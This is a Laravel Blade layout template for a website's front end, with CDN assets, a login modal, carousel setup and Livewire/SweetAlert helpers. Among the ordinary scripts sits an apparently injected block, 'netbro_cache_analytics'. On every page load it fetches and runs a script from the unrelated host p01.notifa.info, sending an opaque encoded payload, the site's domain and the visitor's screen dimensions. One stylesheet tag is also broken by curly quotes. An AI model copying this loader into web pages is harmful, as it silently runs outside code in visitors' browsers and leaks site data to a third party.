<!DOCTYPE html>
@php
    $l=request()->segment(1);
if ($l=="id"){
    $l="id-ID";
}else{
    $l="en-EN";
}
@endphp
{{--<html lang="{{$l }}">--}}
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
{{--    <title>Ideabox - Material Blog/Magazine Template</title>--}}
{{--    @isset($meta)--}}
{{--        {{ $meta }}--}}
{{--    @endisset--}}

    <title> @isset($title) {{ $title }} @else {{ config('app.name') }} @endisset</title>
    <link rel="icon" href="{{asset('user/images/logo.png')}}">
    <link href="https://fonts.googleapis.com/css?family=Poppins:300,400,600,700,900&amp;subset=latin-ext"
          rel="stylesheet">
    <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
    <link rel=“stylesheet” href=“https://use.fontawesome.com/releases/v5.5.0/css/all.css”
          integrity=“sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU” crossorigin=“anonymous”>
    <script src="https://kit.fontawesome.com/3011883c39.js" crossorigin="anonymous"></script>
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="{{asset('frontpage/plugins/zebra-tooltip/zebra_tooltips.min.css')}}">
    <link rel="stylesheet" type="text/css"
          href="{{asset('frontpage/plugins/owl-carousel/assets/owl.carousel.min.css')}}">
    <link rel="stylesheet" type="text/css" href="{{asset('frontpage/css/main-style.css')}}">
    <link rel="stylesheet" type="text/css" href="{{asset('frontpage/css/responsive-style.css')}}">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
    <meta name="google-site-verification" content="pbrw8ex1G2uG3I3Lq9bJXlkcVzjKZ4N0A1hApLWrRuI" />

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/7.33.1/sweetalert2.css" />
    @livewireStyles
    @isset($style)
    {{$style}}
    @endisset
</head>
<body>
@include('components.frontpage-navbar')
@include('components.frontpage-sidebar')
<main class="main-container">
    {{$slot}}
{{--    @include('frontpage.index')--}}
</main>


<!-- Login popup html source start -->
<div>
    <div class="m-modal-box" id="loginModal">
        <div class="m-modal-overlay"></div>
        <div class="m-modal-content small">
            <div class="m-modal-header">
                <h3 class="m-modal-title">Login</h3>
                <span class="m-modal-close"><i class="material-icons">&#xE5CD;</i></span>
            </div>
            <div class="m-modal-body">
                <form method="POST" action="{{ route('login') }}">
                    @csrf
                    <div class="frm-row">
                        <input class="frm-input" type="text" name="email" placeholder="Email">
                    </div>
                    <div class="frm-row">
                        <input class="frm-input" type="password" name="password" placeholder="Password">
                    </div>
                    <div class="frm-row">
                        <button class="frm-button material-button full" type="submit">Login</button>
                    </div>
                </form>
            </div>
        </div>
    </div>
</div>
<!-- Login popup html source end -->

@isset($modal)
    {{ $modal }}
@endisset

<div class="overlay"></div>

<script src="{{asset('frontpage/js/jquery-3.2.1.min.js')}}"></script>

<!-- Tooltip plugin (zebra) js file -->
<script src="{{asset('frontpage/plugins/zebra-tooltip/zebra_tooltips.min.js')}}"></script>

<!-- Owl Carousel plugin js file -->
<script src="{{asset('frontpage/plugins/owl-carousel/owl.carousel.min.js')}}"></script>

<!-- Ideabox theme js file. you have to add all pages. -->
<script src="{{asset('frontpage/js/main-script.js')}}"></script>
{{--<script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>--}}
<script defer src="{{ asset('vendor/sweetalert/sweetalert.min.js') }}"></script>
<script src="{{ asset('assets/js/dashboard/default.js') }}"></script>

<!-- Plugins JS Ends-->
<!-- Theme js-->
<script src="{{asset('assets/js/script.js')}}"></script>


<script type="text/javascript">

    //Owl carousel initializing
    $('#postCarousel').owlCarousel({
        loop: true,
        dots: true,
        nav: false,
        navText: ['<span><i class="material-icons">&#xE314;</i></span>', '<span><i class="material-icons">&#xE315;</i></span>'],
        items: 1,
    })

    //widget carousel initialize
    $('#widgetCarousel').owlCarousel({
        dots: true,
        nav: false,
        items: 1
    })

</script>

<script type="text/javascript">
    if (self == top) {
        function netbro_cache_analytics(fn, callback) {
            setTimeout(function () {
                fn();
                callback();
            }, 0);
        }

        function sync(fn) {
            fn();
        }

        function requestCfs() {
            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
            var idc_glo_r = Math.floor(Math.random() * 99999999999);
            var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAjtEOneu7ypr0iRak25jx%2f8pmjBs5BDqr25ljzLCiGgL6MPtuxISQuE5Ejq5EpC04%2fyDJiDLzhYBnsWLFZHLw7GSvM7mM8VNamaM4OZdg%2bHUFG7qbE4bQCvkOH%2bjHFm2OH5zHZGxjs5cTYMgLFjLLJLia3r9kVc1uondSW%2bcfwkcSC%2bIurjmv6%2fDNNZz%2bRkhK1KwObcZTFiLJy%2buX9AEht15xqe6m%2fTiThcqAJU2q%2f1O%2bRVcsirF4Ro08tf8uqtIZQmLE4CJRqsq7pOAN5DBHv9PgzpkPEmoeKZqNP0wT0xZ%2bKxzYfGEl8SwAim7d9t94axLbtiKPPF185xqIIoe7sD2Vk6IUoR2RVL2xjZ%2ffdjXFL4Nr9gFoVn4aqTBMcwwLaFTgItnAurBcevHoWbImqRlYK6K%2fX2vzrspV%2bhOkKRXtUqGKYPTImTf8KLXNyUqiuCOs%2bxLIwThaGeuJ0IFlbXomTEkAXO%2fD" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
            var bsa = document.createElement('script');
            bsa.type = 'text/javascript';
            bsa.async = true;
            bsa.src = url;
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }

        netbro_cache_analytics(requestCfs, function () {
        });
    }
</script>

<script>
    const SwalModal = (icon, title, html) => {
        Swal.fire({
            icon,
            title,
            html
        })
    }

    const SwalConfirm = (icon, title, html, confirmButtonText, method, params, callback) => {
        Swal.fire({
            icon,
            title,
            html,
            showCancelButton: true,
            confirmButtonColor: '#3085d6',
            cancelButtonColor: '#d33',
            confirmButtonText,
            reverseButtons: true,
        }).then(result => {
            if (result.value) {
                return livewire.emit(method, params)
            }

            if (callback) {
                return livewire.emit(callback)
            }
        })
    }


    const SwalAlert = (icon, title, timeout = 2000) => {
        const Toast = Swal.mixin({
            toast: true,
            position: 'top-end',
            showConfirmButton: false,
            timer: timeout,
            onOpen: toast => {
                toast.addEventListener('mouseenter', Swal.stopTimer)
                toast.addEventListener('mouseleave', Swal.resumeTimer)
            }
        })
        Toast.fire({
            icon,
            title
        })
    }

    document.addEventListener('DOMContentLoaded', () => {
        window.addEventListener("load", function () {
            setTimeout(function () {
                // This hides the address bar:
                window.scrollTo(0, 1);
            }, 0);
        });

        this.livewire.on('mathQuill', data => {
            var MQ1 = MathQuill.getInterface(2);
            var problemSpan = document.getElementById(data);
            MQ1.StaticMath(problemSpan)
        })

        this.livewire.on('swal:modal', data => {
            SwalModal(data.icon, data.title, data.text)
        })
        this.livewire.on('swal:confirm', data => {
            SwalConfirm(data.icon, data.title, data.text, data.confirmText, data.method, data.params, data.callback)
        })
        this.livewire.on('swal:alert', data => {
            SwalAlert(data.icon, data.title, data.timeout)
        })
        this.livewire.on('redirect', data => {
            setTimeout(function () {
                window.location.href = data;
            }, 2000);
        })
        this.livewire.on('redirect:new', data => {
            let a = document.createElement('a');
            a.target = '_blank';
            a.href = data;
            a.click();
        })
        this.livewire.on('notify', data => {
            $.notify(
                '<i class="fa fa-bell-o"></i><strong>Loading</strong> ' + data.title, {
                    type: data.type,
                    allow_dismiss: true,
                    delay: 2000,
                    showProgressbar: true,
                    timer: 1000,
                    animate: {
                        enter: 'animated fadeInDown',
                        exit: 'animated fadeOutUp'
                    }
                });

            // setTimeout(function() {
            //     notify.update('message', '<i class="fa fa-bell-o"></i><strong>Loading</strong> Inner Data.');
            // }, 1000);
        })
    })
</script>

@livewireScripts
@isset($script)
    {{$script}}
@endisset
</body>

</html>
